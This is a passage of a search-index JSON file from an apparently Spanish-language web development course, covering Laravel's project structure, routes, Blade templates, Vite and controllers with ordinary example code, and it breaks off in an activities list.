crear una aplicaci\u00f3n con el servicio de BBDD incluido, pero la m\u00e1s lenta y costosa, ya que por cada aplicaci\u00f3n se crean todos los contenedores asociados a ella.</p>"},{"location":"07frameworks.html#73-entornos-de-desarrollo","title":"7.3 Entornos de desarrollo","text":"<p>Puedes utilizar VS Code con la extensi\u00f3n oficial de Laravel.</p> Extensi\u00f3n de Laravel para VS Code <p>O si lo prefieres, tambi\u00e9n puedes probar PhpStorm de forma gratuita con la cuenta del instituto.</p> IDE PhpStorm gratis para educaci\u00f3n"},{"location":"07frameworks.html#74-estructura-de-una-app","title":"7.4 Estructura de una app","text":"<p>Al crear un nuevo proyecto con Laravel, se crean una serie de carpetas por defecto para ofrecer un punto de partida s\u00f3lido para aplicaciones de cualquier tama\u00f1o siguiendo una estructura modular basada en el patr\u00f3n MVC (Modelo-Vista-Controlador). Esta organizaci\u00f3n facilita la separaci\u00f3n de responsabilidades, mantenimiento y escalabilidad. A continuaci\u00f3n, se describen las carpetas m\u00e1s importantes.</p> <ul> <li>app: Contiene el c\u00f3digo principal de la aplicaci\u00f3n.<ul> <li>Models/ : Incluye las clases de los modelos Eloquent, que representan las tablas de tu base de datos y permiten interactuar con ellas de manera sencilla.</li> <li>Http/ : Incluye controladores, middleware y solicitudes de formulario. Es el lugar donde se maneja la l\u00f3gica relacionada con las solicitudes HTTP que entran en tu aplicaci\u00f3n.<ul> <li>Http/Controllers/ : Controladores que procesan las peticiones y devuelven respuestas.</li> <li>Http/Middleware/ : Clases para filtrar y procesar las peticiones antes de llegar a los controladores.</li> </ul> </li> <li>Policies/ : Gestionan la autenticaci\u00f3n basada en permisos.</li> <li>Providers: Almacena los proveedores de servicios de tu aplicaci\u00f3n, que son responsables de inicializar componentes y enlazar servicios en el contenedor de servicios.</li> </ul> </li> <li>bootstrap: Incluye el archivo app.php que inicia el framework y una carpeta cache con archivos generados para optimizar el rendimiento.</li> <li>config: Alberga todos los archivos de configuraci\u00f3n de la aplicaci\u00f3n. Es recomendable revisarlos para familiarizarse con las opciones disponibles.</li> <li>database: Gesti\u00f3n de bases de datos.<ul> <li>Migraciones/ : Archivos para definir la estructura de las tablas de manera program\u00e1tica.</li> <li>Factor\u00edas/ : Generaci\u00f3n de datos de prueba para los modelos.</li> <li>Seeders/ : Inserci\u00f3n de datos iniciales para la base de datos.</li> </ul> </li> <li>public: Contiene el archivo index.php, punto de entrada para todas las solicitudes, y los recursos p\u00fablicos como im\u00e1genes, JavaScript y CSS.</li> <li>resources: Carpeta de recursos para la interfaz de usuario. Incluye las vistas y los recursos sin compilar, como archivos CSS o JavaScript.<ul> <li>views/ : Contiene las vistas Blade.</li> <li>lang/ : Archivos de traducci\u00f3n para aplicaciones multiling\u00fces.</li> <li>css/ y js/ : Recursos de estilo y funcionalidad del cliente.</li> </ul> </li> <li>routes: Contiene las definiciones de rutas de la aplicaci\u00f3n. <ul> <li>web.php : Rutas para la aplicaci\u00f3n web.</li> <li>api.php : Rutas para APIs RESTful.</li> <li>console.php : Pedidos Artisan personalizados.</li> <li>channels.php : Rutas para canales de difusi\u00f3n.</li> </ul> </li> <li>storage: Almacenamiento de archivos generados por la aplicaci\u00f3n.<ul> <li>app/ : Contiene archivos de usuario o aplicaci\u00f3n.</li> <li>framework/ : Cach\u00e9, sesiones, y otros archivos temporales.</li> <li>logs/ : Registros de errores y actividad.</li> </ul> </li> <li>tests: Contiene las pruebas automatizadas de la aplicaci\u00f3n, con ejemplos de pruebas unitarias y de caracter\u00edsticas.<ul> <li>Feature/ : Pruebas completas que cubren m\u00faltiples componentes.</li> <li>Unit/ : Pruebas individuales para componentes o m\u00e9todos espec\u00edficos.</li> </ul> </li> <li>vendor: Carpeta gestionada por Composer. Contiene todas las dependencias y paquetes de terceros utilizados por el proyecto. No debe modificarse manualmente.</li> </ul> <p>Esta estructura es flexible, permitiendo reorganizar los componentes seg\u00fan las necesidades espec\u00edficas del proyecto, siempre que Composer pueda cargar autom\u00e1ticamente las clases.</p> <p>Es importante destacar que algunos de estos directorios no existen por defecto y se crean a medida que utilizas los comandos de Artisan para generar las clases correspondientes.</p>"},{"location":"07frameworks.html#75-rutas","title":"7.5 Rutas","text":"<p>Podr\u00edamos decir que existen dos tipos principales de rutas:</p> <ul> <li>Rutas web: Almacenadas en el archivo web.php, nos permiten cargar diferentes vistas en funci\u00f3n de la URL que indique el cliente.</li> <li>Rutas API: Almacenadas en el archivo api.php, se utilizan para definir servicios REST.</li> </ul> <p>En este tema, nos centraremos en las rutas web, por lo que editaremos el contenido del archivo <code>routes/web.php</code>. Este archivo es el punto centralizado para la definici\u00f3n de rutas. Cualquier ruta no definida en este archivo no ser\u00e1 v\u00e1lida y generar\u00e1 un error 404.</p> <p>Las rutas pueden:</p> <ol> <li>Devolver directamente un valor desde el archivo de rutas. </li> <li>Llamar una vista o un controlador.</li> </ol>"},{"location":"07frameworks.html#rutas-simples","title":"Rutas simples","text":"<p>Una ruta simple tiene una URL fija y una funci\u00f3n que devuelve una respuesta. Por ejemplo, una petici\u00f3n tipo GET se define as\u00ed:</p> <pre><code>&lt;?php\nRoute::get('/saludo', function () {\n  return 'Hola mundo!';\n});\n</code></pre> <p>Cuando accedamos a <code>http://localhost/saludo</code> (localhost o el equivalente a nuestra app local o en remoto), Laravel devolver\u00e1 \"Hola mundo!\".</p>"},{"location":"07frameworks.html#rutas-con-parametros","title":"Rutas con par\u00e1metros","text":"<p>Se pueden definir par\u00e1metros din\u00e1micos en las rutas mediante claves { }. Por ejemplo:</p> <pre><code>&lt;?php\nRoute::get('/saludo/{nombre}', function ($nombre) {\n  return 'Hola, ' . $nombre;\n});\n</code></pre> <p>Si accedemos a <code>/saludo/Juan</code>, devolver\u00e1 \"Hola, Juan\". Para definir un par\u00e1metro opcional, a\u00f1adimos un s\u00edmbolo ?:</p> <pre><code>&lt;?php\nRoute::get('/saludo/{nombre?}', function ($nombre = \"Invitado\") {\n  return 'Hola, ' . $nombre;\n});\n</code></pre> <p>Ahora, <code>/saludo</code>, devolver\u00e1 \"Hola, Invitado\".</p>"},{"location":"07frameworks.html#validacion-de-parametros","title":"Validaci\u00f3n de par\u00e1metros","text":"<p>Podemos validar los par\u00e1metros usando el m\u00e9todo where. Por ejemplo:</p> <pre><code>&lt;?php\nRoute::get('/saludo/{nombre}', function ($nombre) {\n  return 'Hola, ' . $nom;\n})-&gt;where('nombre', '[A-Za-z]+');\n\nRoute::get('/producto/{id}', function ($id) {\n  return 'Producto ID: ' . $id;\n})-&gt;where('id', '[0-9]+');\n\nRoute::get('/usuario/{nombre}/{id}', function ($nombre, $id) {\n  return 'Usuario: ' . $nombre . ', ID: ' . $id;\n})-&gt;where(['nombre' =&gt; '[A-Za-z]+', 'id' =&gt; '[0-9]+']);\n</code></pre>"},{"location":"07frameworks.html#rutas-con-nombre-alias","title":"Rutas con nombre (alias)","text":"<p>Podemos darle un alias o un nombre a nuestras rutas mediante el m\u00e9todo name para poder referenciarlas f\u00e1cilmente desde nuestras plantillas de Laravel, como se ver\u00e1 m\u00e1s adelante..</p> <pre><code>&lt;?php\nRoute::get('/contacto', function () {\n  return 'P\u00e1gina de contacto';\n })-&gt;name('contacto');\n</code></pre> <p>Podemos utilizar el nombre de la ruta en las plantillas Blade:</p> <pre><code>&lt;?php\n[Contacto]({{ route('contacto') }})\n</code></pre>"},{"location":"07frameworks.html#grupos-de-rutas","title":"Grupos de rutas","text":"<p>Laravel permite agrupar rutas mediante el m\u00e9todo prefix para compartir configuraciones como prefijos o middleware:</p> <pre><code>&lt;?php\nRoute::prefix('admin')-&gt;group(function () {\n  Route::get('/dashboard', function () {\n    return 'Admin Dashboard';\n  });\n\n  Route::get('/usuarios', function () {\n    return 'Admin Usuarios';\n  });\n});\n</code></pre> <p>Esto crea las rutas <code>/admin/dashboard</code> y <code>/admin/usuarios</code>.</p>"},{"location":"07frameworks.html#rutas-con-controladores","title":"Rutas con controladores","text":"<p>Para gestionar l\u00f3gica m\u00e1s compleja, es recomendable utilizar controladores y que sean ellos quienes llamen a la vista correspondiente:</p> <pre><code>&lt;?php\n// Llamada al m\u00e9todo 'mostrar' de UsuarioController pas\u00e1ndole el $id como par\u00e1metro\nRoute::get('/usuario/{id}', [UsuarioController::class, 'mostrar']);\n\n// Controlador definido mediante Artisan\n// php artisan make:controller UsuarioController\n</code></pre>"},{"location":"07frameworks.html#recursos-y-apis","title":"Recursos y APIs","text":"<p>Si queremos hacer CRUDs podemos definir rutas directamente con el m\u00e9todo resource:</p> <pre><code>&lt;?php\nRoute::resource('articles', ArticleController::class);\n</code></pre> <p>Este m\u00e9todo genera autom\u00e1ticamente las rutas para acciones como index, create, store, show, edit, update y destroy.</p> <p>Posible error al crear rutas</p> <p>A la hora de crear rutas, si no lo hacemos bien puede salirnos un error como el siguiente. Un error t\u00edpico en rutas como <code>/usuario/{id}</code> es incluir el par\u00e1metro (id) con el $...</p> <p> Ejemplo de posible error al crear las rutas </p> <p>Ampliar sobre rutas</p> <p>Para m\u00e1s informaci\u00f3n acerca de las rutas, par\u00e1metros y expresiones regulares en las rutas puedes echar un vistazo a la documentaci\u00f3n oficial de rutas que contiene numerosos ejemplos.</p>"},{"location":"07frameworks.html#76-vistas","title":"7.6 Vistas","text":"<p>Las vistas son la forma de presentar el resultado (una pantalla de nuestro sitio web) de forma visual al usuario. Laravel permite estructurar esta parte de la aplicaci\u00f3n utilizando vistas simples o plantillas Blade, una herramienta potente para modularizar y reutilizar el c\u00f3digo de nuestras vistas.</p>"},{"location":"07frameworks.html#que-son-las-vistas","title":"\u00bfQu\u00e9 son las vistas?","text":"<p>Las vistas se definen en la carpeta resources/views y est\u00e1n dise\u00f1adas para separar la parte visual de la l\u00f3gica de la aplicaci\u00f3n. Esta separaci\u00f3n mejora la estructura del proyecto y facilita el mantenimiento del c\u00f3digo.</p> <p>Las vistas no deben contener l\u00f3gica de negocio ni realizar consultas a bases de datos. S\u00f3lo deben recibir datos de los controladores y presentarlos al usuario.</p>"},{"location":"07frameworks.html#mostrar-una-vista","title":"Mostrar una vista","text":"<p>Para mostrar una vista, podemos devolver la funci\u00f3n view desde una ruta o m\u00e9todo de un controlador.</p> <pre><code>&lt;?php\nRoute::get('/', function () {\n  return view('welcome');\n});\n</code></pre>"},{"location":"07frameworks.html#pasar-datos-a-una-vista","title":"Pasar datos a una vista","text":"<p>Es habitual pasar datos a las vistas desde una ruta o controlador.</p> <ol> <li>Con with*:</li> </ol> <pre><code>&lt;?php\nRoute::get('/', function () {\n  $nombre = 'Juan';\n  return view('welcome')-&gt;with('nombre', $nombre);\n});\n</code></pre> <ol> <li>Con un array asociativo:</li> </ol> <pre><code>&lt;?php\n  $nombre = 'Juan';\n  return view('welcome', ['nombre' =&gt; $nombre]);\n</code></pre> <ol> <li>Con la funci\u00f3n compact, que genera un array asociativo utilizando los nombres de las variables que se le pasan como argumentos:</li> </ol> <pre><code>&lt;?php\n  $nombre = 'Juan';\n  return view('welcome', compact('nombre'));\n</code></pre> <ol> <li>Utilizando la funci\u00f3n Route::view:</li> </ol> <pre><code>&lt;?php\nRoute::view('/', 'welcome', ['nombre' =&gt; 'Juan']);\n</code></pre> <p>En la vista, podemos utilizar Blade para mostrar estos datos:</p> <pre><code>  Bienvenido/a, {{ $nombre }}\n</code></pre>"},{"location":"07frameworks.html#plantillas-blade","title":"Plantillas Blade","text":"<p>A trav\u00e9s de las plantillas de Laravel vamos a escribir menos c\u00f3digo PHP y vamos a tener nuestros archivos mejor organizados.</p> <p>Blade es el sistema de plantillas que trae Laravel, por eso los archivos de plantillas que guardamos en el directorio de <code>views</code> llevan la extensi\u00f3n <code>blade.php</code>.</p> <p>De esta manera sabemos inmediatamente que se trata de una plantilla de Laravel y que forma parte de una vista que se mostrar\u00e1 en el navegador.</p>"},{"location":"07frameworks.html#directivas","title":"Directivas","text":"<p>Laravel tiene un gran n\u00famero de directivas que podemos utilizar para ahorrarnos mucho c\u00f3digo repetitivo entre otras funciones.</p> <p>Digamos que las directivas son peque\u00f1as funciones ya escritas que aceptan par\u00e1metros y que cada una de ellas hace una funci\u00f3n diferente dentro de Laravel.</p> <ul> <li><code>@yield</code> Define el contenido din\u00e1mico que se va a cargar. Se usa conjuntamente con @section.</li> <li><code>@section</code> y <code>@endsection</code> bloque de c\u00f3digo din\u00e1mico.</li> <li><code>@extends</code> importa el contenido de una plantilla ya creada.</li> </ul>"},{"location":"07frameworks.html#separando-codigo","title":"Separando c\u00f3digo","text":"<p>Veamos un ejemplo de c\u00f3mo hacer uso del poder de Laravel para crear plantillas y no repetir c\u00f3digo.</p> <p>Supongamos que tenemos ciertas estructuras HTML repetidas como puede ser una cabecera <code>header</code>, un men\u00fa de navegaci\u00f3n <code>nav</code> y un par de secciones que hacen uso de este mismo c\u00f3digo.</p> <p>Supongamos que tenemos 2 apartados en la web:</p> <ul> <li><code>Blog</code></li> <li><code>Fotos</code></li> </ul> <p>Primero de todo tendremos que generar un archivo que haga de <code>plantilla</code> de nuestro sitio web.</p> <p>Para ello creamos el archivo <code>plantilla.blade.php</code> dentro de nuestro directorio de plantillas <code>resources/views</code>.</p> <p>Dicho archivo va a contener el t\u00edpico c\u00f3digo de una p\u00e1gina simple de HTML y en el body a\u00f1adiremos nuestros contenido est\u00e1tico y din\u00e1mico.</p> <pre><code>&lt;body&gt;\n    &lt;!-- CONTENIDO EST\u00c1TICO PARA TODAS LAS SECCIONES --&gt;\n    &lt;h1&gt;Bienvenid@s a Laravel&lt;/h1&gt;\n    &lt;hr&gt;\n\n    &lt;!-- MEN\u00da --&gt;\n    &lt;nav&gt;\n        &lt;a href={{ route('noticias') }}&gt;Blog&lt;/a&gt; | \n        &lt;a href={{ route('galeria') }}&gt;Fotos&lt;/a&gt;\n    &lt;/nav&gt;\n\n    &lt;!-- CONTENIDO DIN\u00c1MICO EN FUNCI\u00d3N DE LA SECCI\u00d3N QUE SE VISITA --&gt;\n    &lt;header&gt;\n        @yield('apartado')\n    &lt;/header&gt;\n&lt;/body&gt;\n</code></pre> <p>Cada secci\u00f3n que haga uso de esta plantilla contendr\u00e1 el texto est\u00e1tico <code>Bienvenid@s a Laravel</code> seguido de un men\u00fa de navegaci\u00f3n con enlaces a cada una de las secciones y el contenido din\u00e1mico de cada secci\u00f3n.</p> <p>Ahora crearemos los archivos din\u00e1micos de cada una de las secciones, en nuestro caso <code>blog.blade.php</code> y <code>fotos.blade.php</code></p> <pre><code>// blog.blade.php\n@extends('plantilla')\n\n@section('apartado')\n  &lt;h2&gt;Est\u00e1s en BLOG&lt;/h2&gt;\n@endsection\n</code></pre> <p>Importamos el contenido de <code>plantilla</code> bajo la directiva <code>@extends</code> para que cargue los elementos est\u00e1ticos que hemos declarado y con la directiva <code>@section</code> y <code>@endsection</code> definimos el bloque de c\u00f3digo din\u00e1mico, en funci\u00f3n de la secci\u00f3n que estemos visitando.</p> <p>Ahora casi lo mismo para la secci\u00f3n de <code>fotos</code></p> <pre><code>// fotos.blade.html\n@extends('plantilla')\n\n@section('apartado')\n  &lt;h2&gt;Est\u00e1s en FOTOS&lt;/h2&gt;\n@endsection\n</code></pre> <p>El \u00faltimo paso que nos queda es configurar el archivo de rutas <code>routes/web.php</code></p> <pre><code>&lt;?php\n// web.php\nRoute::view('blog', 'blog') -&gt; name('noticias');\nRoute::view('fotos', 'fotos') -&gt; name('galeria');\n</code></pre> <p>De esta manera podremos hacer uso del men\u00fa de navegaci\u00f3n que hemos puesto en nuestra plantilla y gracias a los alias <code>noticias</code> y <code>galeria</code>, la URL ser\u00e1 m\u00e1s amigable.</p>"},{"location":"07frameworks.html#estructuras-de-control","title":"Estructuras de control","text":"<p>En Blade siempre que iniciemos un bloque de estructura de control DEBEMOS cerrarlo. Tenemos las siguientes estructuras:</p> <ul> <li><code>@foreach</code> ~ <code>@endforeach</code> lo usamos para recorrer arrays.</li> <li><code>@if</code> ~ <code>@endif</code> para comprobar condiciones l\u00f3gicas.</li> <li><code>@switch</code> ~ <code>@endswitch</code> en funci\u00f3n del valor de una variable ejecutar un c\u00f3digo.<ul> <li><code>@case</code> define la casu\u00edstica del switch.</li> <li><code>@break</code> rompe la ejecuci\u00f3n del c\u00f3digo en curso.</li> <li><code>@default</code> si ninguna casu\u00edstica se cumple.</li> </ul> </li> </ul> <p>Ejemplos:</p> <pre><code>&lt;?php\n$equipo = ['Mar\u00eda', 'Alfredo', 'William', 'Ver\u00f3nica'];\n$edad = 21;\n$opcion = 2;\n\n// en la plantilla blade\n@foreach($equipo as $nombre)\n  &lt;p&gt; {{ $nombre }} &lt;/p&gt;\n@endforeach\n\n\n@if($edad&gt;18)\n  &lt;p&gt;Adelante, con {{ $edad }} accedes sin problemas.&lt;/p&gt;\n@elseif($edad&gt;16)\n  &lt;p&gt;Con {{ $edad }} accedes con autorizaci\u00f3n de tus padres.&lt;/p&gt;\n@else\n  &lt;p&gt;Lo siento, con {{ $edad }} no puedes acceder.&lt;/p&gt;\n@endif\n\n\n@switch($opcion)\n  @case(1)\n    &lt;p&gt;Opci\u00f3n 1...&lt;/p&gt;\n    @break\n  @case(2)\n    &lt;p&gt;Opci\u00f3n 2...&lt;/p&gt;\n    @break\n  @default\n    &lt;p&gt;Opci\u00f3n {{ $opcion }} no es v\u00e1lida.&lt;/p&gt;\n@endswitch\n</code></pre>"},{"location":"07frameworks.html#directivas-formularios","title":"Directivas formularios","text":"<p>Para el uso en formularios existen unas directivas Blade muy \u00fatiles:</p> <ul> <li><code>@checked</code>: Marca la casilla si la condici\u00f3n es <code>true</code>.</li> <li><code>@selected</code>: Selecciona una opci\u00f3n entre las disponibles en la lista desplegables.</li> <li><code>@readonly</code>: A\u00f1ada el atributo <code>readonly</code> para hacer el elemento de solo lectura.</li> <li><code>@required</code>: A\u00f1ada el atributo <code>required</code> para hacer el elemento obligatorio.</li> </ul> <p>Ejemplos:</p> <pre><code>&lt;input type=\"checkbox\" name=\"subscribe\" @checked($user-&gt;subscribed) /&gt;\n\n&lt;select name=\"role\"&gt;\n    &lt;option value=\"admin\" @selected($user-&gt;role ==='admin' )&gt;Admin&lt;/option&gt;\n&lt;/select&gt;\n\n&lt;input type=\"text\" name=\"username\" @readonly($user-&gt;is_admin) /&gt;\n\n&lt;input type=\"email\" name=\"email\" @required($user-&gt;needs_verification) /&gt;\n</code></pre>"},{"location":"07frameworks.html#componentes-blade","title":"Componentes Blade","text":"<p>Los Componentes Blade permiten definir elementos reutilizables:</p> <ol> <li>Crear componente de ejemplo 'Alert': </li> </ol> <pre><code>php artisan make:component Alert\n</code></pre> <p>Esto, crear\u00e1 2 archivos:</p> <ul> <li>Component [app/View/Components/Alert.php] created successfully.  </li> <li>View [resources/views/components/alert.blade.php] created successfully. </li> </ul> <ol> <li>Definir la l\u00f3gica en app/View/Components/Alert.php: </li> </ol> <pre><code>&lt;?php\nclass Alert extends Component{\n    public string $type;\n    // Create a new component instance.\n    public function __construct($type = 'info') {\n        $this-&gt;type = $type;\n    }\n\n    // Get the view / contents that represent the component.\n    public function render(): View|Closure|string {\n        return view('components.alert');\n    }\n}\n</code></pre> <ol> <li>Definir la vista en resources/views/components/alert.blade.php: </li> </ol> <pre><code>&lt;div class=\"border rounded-lg shadow-md p-4 bg-white\"&gt;\n    &lt;p&gt;&lt;strong&gt;Alerta tipo:&lt;/strong&gt; {{ $type }}&lt;/p&gt;\n    &lt;p&gt;Mensaje: {{ $slot }}&lt;/p&gt; &lt;!-- lo que ir\u00e1 entre la etiqueta de apertura y cierre del componente --&gt;\n&lt;/div&gt;\n</code></pre> <ol> <li>Usar el componente en una vista:</li> </ol> <pre><code>&lt;x-alert type=\"Notificaci\u00f3n\" /&gt;\n&lt;!-- Lo que se cargar\u00e1 en $slot de la vista --&gt;\n&lt;x-alert type=\"Advertencia\"&gt;Esto va dentro del alert.&lt;/x-alert&gt;\n</code></pre> <p>Las expresiones y variables PHP se deben pasar al componente mediante atributos que utilicen el car\u00e1cter : como prefijo o se interpolan con {{ }}. Ejemplo:</p> <pre><code>&lt;x-alert :type=\"$tipo\" /&gt;\n&lt;x-alert type=\"{{ $tipo }}\" /&gt; &lt;!-- Mejor as\u00ed --&gt;\n</code></pre> <p>Ampliar sobre vistas</p> <p>Para m\u00e1s informaci\u00f3n acerca de las vistas, incluso la reciente posibilidad de crearlas mediante React o Vue gracias a Inertia, seguir la documentaci\u00f3n oficial de vistas. Y para aqu\u00ed para m\u00e1s info sobre las plantillas Blade.</p>"},{"location":"07frameworks.html#77-css-y-js-en-el-cliente","title":"7.7 CSS y JS en el cliente","text":"<p>Ahora que ya conocemos c\u00f3mo utilizar Blade para modularizar nuestras vistas, es momento de a\u00f1adir estilos CSS y scripts Javascript para mejorar la presentaci\u00f3n y funcionalidad de nuestro proyecto Laravel integra Vite, una herramienta moderna para gestionar y empaquetar los recursos del frontend.</p>"},{"location":"07frameworks.html#que-es-vite","title":"\u00bfQu\u00e9 es Vite?","text":"<p>Vite es una herramienta de construcci\u00f3n de frontend que ofrece un entorno de desarrollo extremadamente r\u00e1pido y empaqueta el c\u00f3digo para producci\u00f3n. Con Laravel, Vite permite:</p> <ul> <li>Gestionar archivos CSS y Javascript del proyecto.</li> <li>Optimizar los recursos para la producci\u00f3n.</li> <li>Cargar los cambios en tiempo real durante el desarrollo.</li> </ul>"},{"location":"07frameworks.html#conector-vite","title":"Conector Vite","text":"<p>Laravel incluye por defecto un conector oficial para trabajar con Vite. </p> <p>En la ra\u00edz del proyecto se encuentra el archivo package.json con las dependencias del frontend, incluido el conector de Laravel para Vite. Para instalarlas, ejecuta desde consola:</p> <pre><code>npm install\n</code></pre>"},{"location":"07frameworks.html#configuracion-de-vite","title":"Configuraci\u00f3n de Vite","text":"<p>La configuraci\u00f3n de Vite se encuentra en el archivo vite.config.js, donde se definen los puntos de entrada (CSS y Javascript) del proyecto:</p> <pre><code>import { defineConfig } from 'vite';\nimport laravel from 'laravel-vite-plugin';\n\nexport default defineConfig({\n    plugins: [\n        laravel({\n            input: [\n                'resources/css/app.css', \n                'resources/js/app.js'],\n            refresh: true,\n        }),\n    ],\n});\n</code></pre> <p>Es posible a\u00f1adir complementos adicionales si utilizas frameworks como Vue o React.</p>"},{"location":"07frameworks.html#cargar-css-y-js-en-las-vistas","title":"Cargar CSS y JS en las vistas","text":"<p>Una vez configurados los puntos de entrada en el archivo vite.config.js, puedes cargar los recursos en las vistas utilizando la directiva @vite de Blade. Por ejemplo:</p> <pre><code>&lt;head&gt;\n      &lt;meta charset=\"UTF-8\"&gt;\n      @vite(['resources/css/app.css'])\n&lt;/head&gt;\n&lt;body class=\"font-sans bg-gray-100 text-gray-900\"&gt;\n  ...\n</code></pre> <p>Esta directiva se encarga autom\u00e1ticamente de: </p> <ul> <li>Reemplazo de m\u00f3dulos en vivo (Hot Module Replacement - HMR): Los m\u00f3dulos se actualicen en tiempo de ejecuci\u00f3n sin necesidad de una actualizaci\u00f3n de la p\u00e1gina completa.</li> <li>Cargar los archivos versionados en producci\u00f3n.</li> </ul>"},{"location":"07frameworks.html#ejecutar-vite","title":"Ejecutar Vite","text":"<p>Podemos ejecutar Vite seg\u00fan estemos en desarrollo o producci\u00f3n:</p> <ol> <li>Desarrollo: Ejecutar el servidor de Vite para reflejar los cambios autom\u00e1ticamente en el navegador.</li> </ol> <pre><code>npm run dev\n</code></pre> <ol> <li>Producci\u00f3n: Empaquetar y versionar los recursos en su version final para producci\u00f3n.</li> </ol> <pre><code>npm run build\n</code></pre>"},{"location":"07frameworks.html#78-controladores","title":"7.8 Controladores","text":"<p>Los controladores son una pieza clave en Laravel para organizar y estructurar la l\u00f3gica de nuestra aplicaci\u00f3n. Permiten separar la gesti\u00f3n de las rutas y la l\u00f3gica del negocio, haciendo que el c\u00f3digo sea m\u00e1s limpio, escalable y f\u00e1cil de mantener.</p> <p>Por defecto, los controladores se guardan en una carpeta espec\u00edfica situada en <code>app/Http/Controllers</code> y tienen extensi\u00f3n <code>.php</code>.</p>"},{"location":"07frameworks.html#crear-un-controlador","title":"Crear un controlador","text":"<p>Artisan nos va a facilitar la creaci\u00f3n de un controlador. Abrimos una terminal y desde la ra\u00edz del proyecto ejecutamos <code>php artisan make:controller NombreController</code>. Por convenci\u00f3n, los controladores suelen acabar con el sufijo Controller. </p> <p>Ejemplo:</p> <pre><code>php artisan make:controller PagesController\n</code></pre> <p>Si todo ha salido bien, recibiremos un mensaje por consola con que todo ha ido bien y podremos comprobar que, efectivamente se ha creado el archivo <code>PagesController.php</code> con una estructura b\u00e1sica de controlador, dentro de la carpeta <code>Controllers</code> que hemos descrito anteriormente.</p>"},{"location":"07frameworks.html#separar-la-logica","title":"Separar la l\u00f3gica","text":"<p>Ahora podemos modificar nuestro archivo de rutas <code>web.pbp</code> para dejarlo limpio de l\u00f3gica y trasladar \u00e9sta a nuestro nuevo controlador. La idea es dejar <code>web.php</code> tan limpio como podamos para que, de un vistazo, se entienda todo perfectamente.</p> <p>RECUERDA que s\u00f3lo movemos la l\u00f3gica, mientras que las cl\u00e1usulas como <code>where</code> y <code>name</code> las seguimos dejando en el archivo de rutas <code>web.php</code></p> <p>Veamos c\u00f3mo quedar\u00eda un refactor del archivo de rutas utilizando un <code>Controller</code> como el que acabamos de crear:</p> <pre><code>&lt;?php\n// web.php (v2.0) \u2592\u2592\u2592\u2592 Refactorizado\n\nuse App\\Http\\Controllers\\PagesController;\nuse Illuminate\\Support\\Facades\\Route;\n\nRoute::get('/', [ PagesController::class, 'inicio' ]);\nRoute::get('datos', [ PagesController::class, 'datos' ]);\nRoute::get('cliente/{id?}', [ PagesController::class, 'cliente' ]) -&gt; where('id', '[0-9]+');\nRoute::get('nosotros/{nombre?}', [ PagesController::class, 'nosotros']) -&gt; name('nosotros');\n</code></pre> <p>y en nuestro archivo controlador lo dejar\u00edamos de la siguiente manera</p> <pre><code>&lt;?php\n// PagesController.php\nnamespace App\\Http\\Controllers;\n\nclass PagesController extends Controller\n{\n    public function inicio() { \n      return view('welcome'); \n    }\n\n    public function datos() { \n      return view('usuarios', ['id' =&gt; 56]);\n    }\n\n    public function cliente($id = 1) {\n      return ('Cliente con el id: ' . $id);\n    }\n\n    public function nosotros($nombre = null) {\n      $equipo = ['Paco', 'Enrique', 'Maria', 'Veronica'];\n      return view('nosotros', compact('equipo', 'nombre'));\n    }\n}\n</code></pre>"},{"location":"07frameworks.html#controlador-de-recursos","title":"Controlador de recursos","text":"<p>Podemos generar un controlador de recursos con la opci\u00f3n -r. Esto crear\u00e1 un controlador con m\u00e9todos predeterminados para operaciones comunes. Ejemplo:</p> <pre><code>php artisan make:controller PhotoController -r\n</code></pre> <p>Los m\u00e9todos generados son:</p> <ul> <li>index: Mostrar un listado de elementos.</li> <li>create: Mostrar un formulario para crear un nuevo elemento.</li> <li>store: Almacenar un nuevo elemento en la base de datos.</li> <li>show: Mostrar un elemento espec\u00edfico.</li> <li>edit: Mostrar un formulario para editar un elemento existente.</li> <li>update: Actualizar un elemento en la base de datos.</li> <li>destroy: Eliminar un elemento.</li> </ul> <p>Estos m\u00e9todos se llaman desde el archivo de rutas exactamente igual que los m\u00e9toodos hechos a mano antes, aunque tambi\u00e9n tenemos la opci\u00f3n de registrar todas las rutas autom\u00e1ticamente mediante el m\u00e9todo Route::resource:</p> <pre><code>&lt;?php\n// web.php (v2.0) \u2592\u2592\u2592\u2592 Refactorizado\nRoute::resource('photos', PhotoController::class);\n</code></pre> <p>Las acciones manejadas por el controlador de recursos con su URI y nombre de la ruta:</p> Verb URI Action Route Name GET /photos index photos.index GET /photos/create create photos.create POST /photos store photos.store GET /photos/{photo} show photos.show GET /photos/{photo}/edit edit photos.edit PUT/PATCH /photos/{photo} update photos.update DELETE /photos/{photo} destroy photos.destroy"},{"location":"07frameworks.html#organizacion-de-vistas","title":"Organizaci\u00f3n de vistas","text":"<p>Las vistas asociadas a un controlador suelen estar estructuradas dentro de la carpeta resources/views en una subcarpeta con nombre del controlador o modelo. Ejemplo:</p> <ul> <li>Controlador: PhotoController</li> <li>Vistas: resources/views/photo/index.blade.php, resources/views/photo/show.blade.php, etc.</li> </ul> <p>Para renderizar estas vistas desde el controlador se usa carpeta.vista:</p> <pre><code>&lt;?php\n// PhotoController.php\npublic function index() {\n  return view('photo.index');\n}\n</code></pre>"},{"location":"07frameworks.html#organizacion-de-controladores","title":"Organizaci\u00f3n de controladores","text":"<p>Los controladores tambi\u00e9n se pueden organizar en subcarpetas dentro de app/Http/Controllers. Para crearlo se indica la subcarpeta:</p> <pre><code>php artisan make:controller Photo/AdminController\n</code></pre> <p>Y a la hora de utilizarlo, hay que incluir su espacio de nombres:</p> <pre><code>&lt;?php\n// web.php \nRoute::get('admin', [App\\Http\\Controllers\\Photo\\AdminController::class, 'method']);\n</code></pre> <p>Ampliar sobre controladores</p> <p>Para m\u00e1s informaci\u00f3n acerca de los controladores, seguir la documentaci\u00f3n oficial de controladores.</p>"},{"location":"07frameworks.html#actividades","title":"Actividades","text":"<ol> <li>Crea un sitio web con Laravel que contenga el t\u00edtulo \"Bienvenidos a Laravel\", un texto de bienvenida (puede ser un poco de Lorem Ipsum) y a continuaci\u00f3n un men\u00fa de navegaci\u00f3n con sus correspondientes alias y los siguientes enlaces:</li> </ol> <ul> <li> <p><code>Inicio</code> enlace a la p\u00e1gina principal donde se visualizar\u00e1 el texto de Lorem Ipsum adem\u00e1s de los elementos est\u00e1ticos (T\u00edtulo y men\u00fa de navegaci\u00f3n).</p> </li> <li> <p><code>Nosotros</code> enlace que vaya a la p\u00e1gina \"nosotros\"  y muestre, adem\u00e1s de los elementos est\u00e1ticos de todo el sitio, un h2 que diga \"Est\u00e1s en la secci\u00f3n Nosotros\"</p> </li> <li> 